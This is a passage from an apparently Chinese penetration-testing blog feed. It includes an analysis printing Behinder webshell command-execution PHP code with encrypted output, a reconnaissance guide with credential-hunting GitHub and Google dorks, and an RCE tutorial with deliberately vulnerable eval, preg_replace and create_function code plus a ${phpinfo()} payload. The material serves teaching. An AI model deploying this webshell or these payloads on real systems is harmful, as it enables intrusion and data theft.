invoke__">ob_end_clean</span>();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$JueQDBH</span>(<span class="hljs-string">&#x27;proc_open&#x27;</span>) <span class="hljs-keyword">and</span> ! <span class="hljs-variable">$Bvce</span>(<span class="hljs-string">&#x27;proc_open&#x27;</span>, <span class="hljs-variable">$PadtJn</span>)) &#123;<br>        <span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$c</span>, <span class="hljs-keyword">array</span>(<br>            <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&#x27;pipe&#x27;</span>,<br>                <span class="hljs-string">&#x27;r&#x27;</span><br>            ),<br>            <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&#x27;pipe&#x27;</span>,<br>                <span class="hljs-string">&#x27;w&#x27;</span><br>            ),<br>            <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&#x27;pipe&#x27;</span>,<br>                <span class="hljs-string">&#x27;w&#x27;</span><br>            )<br>        ), <span class="hljs-variable">$pipes</span>);<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">while</span> (! <span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) &#123;<br>            <span class="hljs-variable">$kWJW</span> .= <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">1024</span>);<br>        &#125;<br>        @<span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$handle</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$JueQDBH</span>(<span class="hljs-string">&#x27;passthru&#x27;</span>) <span class="hljs-keyword">and</span> ! <span class="hljs-variable">$Bvce</span>(<span class="hljs-string">&#x27;passthru&#x27;</span>, <span class="hljs-variable">$PadtJn</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">ob_start</span>();<br>        <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$JueQDBH</span>(<span class="hljs-string">&#x27;shell_exec&#x27;</span>) <span class="hljs-keyword">and</span> ! <span class="hljs-variable">$Bvce</span>(<span class="hljs-string">&#x27;shell_exec&#x27;</span>, <span class="hljs-variable">$PadtJn</span>)) &#123;<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$c</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$JueQDBH</span>(<span class="hljs-string">&#x27;exec&#x27;</span>) <span class="hljs-keyword">and</span> ! <span class="hljs-variable">$Bvce</span>(<span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-variable">$PadtJn</span>)) &#123;<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$c</span>, <span class="hljs-variable">$kWJW</span>);<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-title function_ invoke__">join</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">10</span>), <span class="hljs-variable">$kWJW</span>) . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">10</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$JueQDBH</span>(<span class="hljs-string">&#x27;exec&#x27;</span>) <span class="hljs-keyword">and</span> ! <span class="hljs-variable">$Bvce</span>(<span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-variable">$PadtJn</span>)) &#123;<br>        <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-variable">$c</span>, <span class="hljs-string">&#x27;r&#x27;</span>);<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$fp</span>)) &#123;<br>            <span class="hljs-keyword">while</span> (! <span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123;<br>                <span class="hljs-variable">$kWJW</span> .= <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>);<br>            &#125;<br>        &#125;<br>        @<span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$fp</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;status&quot;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&quot;fail&quot;</span>);<br>        <span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;msg&quot;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;</span>);<br>        <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encrypt</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$result</span>), <span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">return</span>;<br>        <br>    &#125;<br>    <span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;status&quot;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&quot;success&quot;</span>);<br>    <span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;msg&quot;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">getSafeStr</span>(<span class="hljs-variable">$kWJW</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encrypt</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$result</span>),  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>    &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">openssl_encrypt</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>    &#125;<br>&#125;<span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;Y2QgL2QgIkM6XHBocHN0dWR5X3Byb1xXV1dcIiZ3aG9hbWk=&quot;</span>;<span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cmd</span>);<span class="hljs-variable">$path</span>=<span class="hljs-string">&quot;QzovcGhwc3R1ZHlfcHJvL1dXVy8=&quot;</span>;<span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-title function_ invoke__">main</span>(<span class="hljs-variable">$cmd</span>,<span class="hljs-variable">$path</span>);<br>再利用浏览器调<br></code></pre></td></tr></table></figure><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%877.png"></p><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%878.png"></p><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%879.png"></p><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%8710.png"></p><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%8711.png"></p><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%8712.png"></p><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%8713.png"></p><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%8714.png"></p><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%8715.png"></p><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%8716.png"></p><p><img src="/2021/07/02/%E5%86%B0%E8%9D%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%8717.png"></p>]]></content>
    
    
    <categories>
      
      <category>外网知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>冰蝎命令执行分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>蚁剑簡單流量分析</title>
    <link href="/2021/05/26/%E8%9A%81%E5%89%91%E7%B0%A1%E5%96%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <url>/2021/05/26/%E8%9A%81%E5%89%91%E7%B0%A1%E5%96%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/05/26/%E8%9A%81%E5%89%91%E7%B0%A1%E5%96%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%871.png"></p><p><img src="/2021/05/26/%E8%9A%81%E5%89%91%E7%B0%A1%E5%96%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%872.png"></p><p><img src="/2021/05/26/%E8%9A%81%E5%89%91%E7%B0%A1%E5%96%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%873.png"></p><p><img src="/2021/05/26/%E8%9A%81%E5%89%91%E7%B0%A1%E5%96%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%874.png"></p><p><img src="/2021/05/26/%E8%9A%81%E5%89%91%E7%B0%A1%E5%96%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%875.png"></p><p><img src="/2021/05/26/%E8%9A%81%E5%89%91%E7%B0%A1%E5%96%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%876.png"></p><p><img src="/2021/05/26/%E8%9A%81%E5%89%91%E7%B0%A1%E5%96%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%877.png"></p><p><img src="/2021/05/26/%E8%9A%81%E5%89%91%E7%B0%A1%E5%96%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%878.png"></p><p><img src="/2021/05/26/%E8%9A%81%E5%89%91%E7%B0%A1%E5%96%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E5%9B%BE%E7%89%879.png"></p>]]></content>
    
    
    <categories>
      
      <category>滲透工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>蚁剑</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2021/05/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2021/05/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>今天就来谈谈当我们拿到一个网站首先干的一件事情-信息收集</p><p>如果信息收集的比较全面,就意味着你这次的渗透测试工作已经成功了一半.<br>信息收集的内容包括目标系统的架构,ip资产,敏感信息,合作商等等.</p><p>一.域名<br>1.备案查询 通过下面这些网站可以查询到一些域名邮箱电话等信息<br>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p><p>爱企查：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></p><p>官方ICP备案查询：<a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></p><p>2.fofa,google查询</p><p>语法:<br>domain&#x3D;”example.com”<br>header&#x3D;”example.com”<br>cert&#x3D;”example.com”<br>host&#x3D;”example.com”<br>body&#x3D;”example.com”<br>它们语法都差不多</p><p>3.证书查询<br>网站查询：<a href="https://crt.sh/?q=baidu.com">https://crt.sh/?q=baidu.com</a></p><p>5.dns查询<br>6.whois查询<br>通过查询目标的WHOIS信息，对联系人、联系邮箱等信息进行反查以及查看whois历史信息，获取更多相关的域名信息；微步在线也可以根据IP、邮箱等查询历史域名。</p><p>7.通过众测平台查询资产范围，在众测平台上有些厂商会把资产范围放出来。</p><p>8.通过主域名对子域名进行搜索，可使用工具、搜索引擎等。</p><p>OneForAll：集成多种方式搜集子域名，包括dns查询、证书查询等；</p><p>Amass：kali自带，集成多种收集方式，强烈推荐；</p><p><a href="https://crt.sh/%EF%BC%9A%E9%80%9A%E8%BF%87%E8%AF%81%E4%B9%A6%E6%9F%A5%E6%89%BE%E5%AD%90%E5%9F%9F%E5%90%8D%E5%92%8C%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%EF%BC%9B">https://crt.sh/：通过证书查找子域名和指纹识别；</a></p><p><a href="https://dnsdumpster.com：是一个在线实用程序，可以查找子域、目标的DNS记录。">https://dnsdumpster.com：是一个在线实用程序，可以查找子域、目标的DNS记录。</a></p><p>9.直接访问收集到的主域名，对网页上指向的域名链接进行收集（可能会放一些OA等办公系统的跳转）。</p><p>10.枚举域名</p><p><a href="https://github.com/infosec-au/altdns%EF%BC%8C">https://github.com/infosec-au/altdns，</a> Altdns是一个DNS侦察工具，允许发现符合模式的子域。Altdns接收可能出现在域下的子域中的单词（如 test、dev、staging），并接收您知道的子域列表。</p><p>11.收集APP、公众号、小程序、PC应用资产</p><p>11.1 天眼查、企查查<br>11.2 微信APP搜索（小程序、公众号）</p><p>11.3 支付宝搜索（小程序、公众号）</p><p>11.4 工具ENScan（可查询企业APP信息、微信公众号信息、供应商信息等）</p><p>11.5 APP 查找应用商店、豌豆荚（可下载历史app）</p><p>11.6 PC可通过官网进行查找下载</p><p>12.根据前几种方式获取相关IP，然后探测可能存在的C段，可获取一些没有相关联信息的隐藏资产，再通过IP反查域名（<a href="https://github.com/Sma11New/ip2domain%EF%BC%89">https://github.com/Sma11New/ip2domain）</a></p><p>IP收集<br>1.真实IP查找</p><p>CDN判断：</p><p>多地ping，全球ping，查看解析IP是否一致；</p><p>NSlookup：通过nslookup查看不同DNS域名解析情况来判断是否使用了CDN；</p><p>在线检测：<a href="https://www.cdnplanet.com/tools/cdnfinder/%EF%BC%9B">https://www.cdnplanet.com/tools/cdnfinder/；</a></p><p>通过https证书：有的cdn颁发的证书带有cdn名称，可通过https证书进行cdn识别；</p><p>真实IP查找：</p><p>通过查询历史DNS记录站点在做CDN之前可能将域名解析到真实IP，通过查询DNS历史记录可能会找到CDN使用前的真实IP，<a href="https://dnsdb.io/zh-cn/https://x.threatbook.cn/http://toolbar.netcraft.com/site_report?url=http://viewdns.info/http://www.17ce.com/https://community.riskiq.com/http://www.crimeflare.com/cfssl.html%EF%BC%9B">https://dnsdb.io/zh-cn/https://x.threatbook.cn/http://toolbar.netcraft.com/site_report?url=http://viewdns.info/http://www.17ce.com/https://community.riskiq.com/http://www.crimeflare.com/cfssl.html；</a></p><p>子域查询法：CDN服务的使用成本还是挺高的，所以很多的站点只对流量大的主站做了CDN，这种情况下我们通过子域枚举就能获取到子站的真实IP，再进行C段；</p><p>全球ping：很多CDN厂商因为某些原因仅对国内线路做了解析，这种情况下使用国外主机直接访问就可能获取到真实IP；</p><p>通过网站漏洞，如：phpinfo；</p><p>需要找xiaix.me网站的真实IP，我们首先从apnic获取IP段，然后使用Zmap的banner-grab扫描出来80端口开放的主机进行banner 抓取，最后在http-req中的Host写xiaix.me；</p><p>利用应用功能，抓取反向连接查找服务器IP，或者根据应用返回&#x2F;报错查看。</p><p>2.通过IP地址注册信息查询：<a href="https://ipwhois.cnnic.net.cn/">https://ipwhois.cnnic.net.cn/</a></p><p>3.对上面域名解析获得的单个IP输入查询框，会有一个IP范围</p><p>4.使用FOFA等互联网资产收集工具直接搜索公司名称</p><p>5.C段扫描</p><p>rustscan：速度快；</p><p>goby：图形化直观，支持漏洞验证，端口扫描；</p><p>fscan：速度快，主机存活探测、端口扫描、常见服务的爆破。</p><p>敏感信息收集<br>1.利用Google</p><p>Google常用语法：site:<em>.test.cn filetype:xlsx 学号 site:</em>.test.cn filetype:docx | pdf | csv | json</p><p>搜集管理后台：site:xxx.com 管理、site:xxx.com admin、site:xxx.com login 搜集mail：site:xxx.com intext:@xxx.com 搜集敏感web路径：site:xxx.com intitle:登录／site:xxx.com inurl:sql.php</p><p>site:*.xxx.com intext:Index of&#x2F;</p><p>其他语法：<a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p><p>2.利用托管平台，如：GitHub、码云等</p><p>GitHub常用语法：</p><p>敏感信息：xx.com “关键字”</p><p>文件搜索：xxx.com filename:properties</p><p>关键字：Passwords api_key “api keys” authorization_bearer: oauth auth authentication client_secret api_token: “api token” client_id password user_password user_pass passcode client_secret secret password hash OTP user auth</p><p>注意事项：如果搜索含有空格的查询，需要用引号将其括起来；</p><p>3.目录扫描</p><p>备份文件&#x2F;默认后台</p><p>源码泄露（.git&#x2F;.svn）</p><p>通过上面的收集能拿到：域名、IP、邮箱、姓名、手机号等，但需要验证是否属于该单位资产，以及需要对域名以及IP进行存活探测、端口扫描、web指纹识别、目录扫描等，快速定位到易被攻击的系统，从而实施进一步攻击。</p><p>存活探测，敏感资产定位<br><a href="https://github.com/EASY233/Finger%EF%BC%9A%E4%B8%80%E6%AC%BE%E7%BA%A2%E9%98%9F%E5%9C%A8%E5%A4%A7%E9%87%8F%E7%9A%84%E8%B5%84%E4%BA%A7%E4%B8%AD%E5%AD%98%E6%B4%BB%E6%8E%A2%E6%B5%8B%E4%B8%8E%E9%87%8D%E7%82%B9%E6%94%BB%E5%87%BB%E7%B3%BB%E7%BB%9F%E6%8C%87%E7%BA%B9%E6%8E%A2%E6%B5%8B%E5%B7%A5%E5%85%B7%EF%BC%9B">https://github.com/EASY233/Finger：一款红队在大量的资产中存活探测与重点攻击系统指纹探测工具；</a></p><p><a href="https://github.com/al0ne/Vxscan%EF%BC%9Apython3%E5%86%99%E7%9A%84%E7%BB%BC%E5%90%88%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%B8%BB%E8%A6%81%E7%94%A8%E6%9D%A5%E5%AD%98%E6%B4%BB%E9%AA%8C%E8%AF%81%EF%BC%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B(%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/js%E6%B3%84%E9%9C%B2%E6%8E%A5%E5%8F%A3/html%E6%B3%A8%E9%87%8A%E6%B3%84%E9%9C%B2)%EF%BC%8CWAF/CDN%E8%AF%86%E5%88%AB%EF%BC%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%EF%BC%8C%E6%8C%87%E7%BA%B9/%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB%E7%AD%89%EF%BC%9B">https://github.com/al0ne/Vxscan：python3写的综合扫描工具，主要用来存活验证，敏感文件探测(目录扫描/js泄露接口/html注释泄露)，WAF/CDN识别，端口扫描，指纹/服务识别等；</a></p><p><a href="https://github.com/EdgeSecurityTeam/EHole%EF%BC%9A%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%9C%9F%E9%97%B4%E8%83%BD%E5%A4%9F%E5%BF%AB%E9%80%9F%E4%BB%8EC%E6%AE%B5%E3%80%81%E5%A4%A7%E9%87%8F%E6%9D%82%E4%B9%B1%E7%9A%84%E8%B5%84%E4%BA%A7%E4%B8%AD%E7%B2%BE%E5%87%86%E5%AE%9A%E4%BD%8D%E5%88%B0%E6%98%93%E8%A2%AB%E6%94%BB%E5%87%BB%E7%9A%84%E7%B3%BB%E7%BB%9F%EF%BC%8C%E4%BB%8E%E8%80%8C%E5%AE%9E%E6%96%BD%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%94%BB%E5%87%BB%E3%80%82">https://github.com/EdgeSecurityTeam/EHole：在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。</a></p><p>学习于：白帽子左一</p>]]></content>
    
    
    <categories>
      
      <category>外网知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>任意代码执行漏洞</title>
    <link href="/2021/04/26/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/04/26/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h4 id="任意代码执行漏洞-RCE"><a href="#任意代码执行漏洞-RCE" class="headerlink" title="任意代码执行漏洞(RCE)"></a>任意代码执行漏洞(RCE)</h4><p>​    在web应用中有时候程序员为了考虑灵活性,间接性,会在代码调用eval函数(php函数去处理).比如当应用再调节一些能将字符串转化位代码函数时,没有考虑用户是否能控制这个字符串,将造成代码执行漏洞</p><p>eval()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//关闭方法</span><br> <span class="hljs-variable">$data</span>=<span class="hljs-variable">$_GET</span>[‘data’];<br> <span class="hljs-keyword">eval</span>(“\<span class="hljs-variable">$ret</span> = <span class="hljs-title function_ invoke__">strtolower</span>(‘<span class="hljs-variable">$data</span>’);”);<br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ret</span>;<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//eval 属于PHP语法构造的一部分，并不是一个函数，所以不能通过 变量函数 的形式来调用（虽然她确实像极了函数原型）。这样的语法构造还包括：echo，print，unset()，isset()，empty()，include，require，... 可能这就是为什么有时候要用到双层eval(eval())</span><br></code></pre></td></tr></table></figure><p>assert()函数(分散拼接在调用)php7.1版本以上使用不了</p><p>preg_replace()(很好过安全狗)函数 5.7及其以上被禁用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span> [ <span class="hljs-string">&#x27;data&#x27;</span> ];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&quot;/test/e&quot;</span> ,<span class="hljs-variable">$a</span>, <span class="hljs-string">&quot;just test! &quot;</span>)<br><span class="hljs-meta">?&gt;</span><br>因为正则的模式是e所以传进去大的参数会被执行<br></code></pre></td></tr></table></figure><p>preg_replace 函数执行一个正则表达式的搜索和替换</p><p>关键点时:看就是第二个replacement参数我们能否控制,然后,第一个pattern参数是否带了&#x2F;e 执行模式</p><p>需要注意的是,第三个参数,必须满足第一个pattern参数的条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-variable">$data</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;<br> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;</span>, <span class="hljs-string">&#x27;$ret=&quot;\\1&quot;;&#x27;</span>, <span class="hljs-variable">$data</span>);<br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ret</span>;<br><span class="hljs-meta">?&gt;</span><br>$&#123;&#125;优先当成变量执行,而不是data标签会当成字符串输出<br></code></pre></td></tr></table></figure><ul><li><img src="/2021/04/26/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20221026205523125.png"></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a,$b&#x27;</span>,<span class="hljs-string">&#x27;echo $a,$b;&#x27;</span>);<br><span class="hljs-title function_ invoke__">func</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>);<br><span class="hljs-comment">//相当于匿名函数</span><br>前面两个只是作为参数作用,后面那两个是作为方法体的内容,控制的点是后面<br></code></pre></td></tr></table></figure><p><img src="/2021/04/26/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20221026205635949.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$sort_by</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sort_by&#x27;</span>];<br><span class="hljs-variable">$sorter</span> = <span class="hljs-string">&#x27;strnatcasecmp&#x27;</span>;<br><span class="hljs-variable">$sort_function</span> = <span class="hljs-string">&#x27; return 1 * &#x27;</span> . <span class="hljs-variable">$sorter</span> . <span class="hljs-string">&#x27;($a[&quot;&#x27;</span> . <span class="hljs-variable">$sort_by</span> . <span class="hljs-string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="hljs-variable">$sort_by</span> . <span class="hljs-string">&#x27;&quot;]);&#x27;</span>;<br><span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a,$b&#x27;</span>, <span class="hljs-variable">$sort_function</span>);<br><span class="hljs-variable">$func</span>(<span class="hljs-number">1</span>,<span class="hljs-variable">$sort_by</span>);<br><span class="hljs-meta">?&gt;</span><br>http:<span class="hljs-comment">//127.0.0.1/5.php?sort_by=$&#123;phpinfo()&#125;</span><br>$&#123;&#125;就是当变量执行,而不是字符串<br></code></pre></td></tr></table></figure><p><img src="/2021/04/26/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20221026205717211.png"></p><p><img 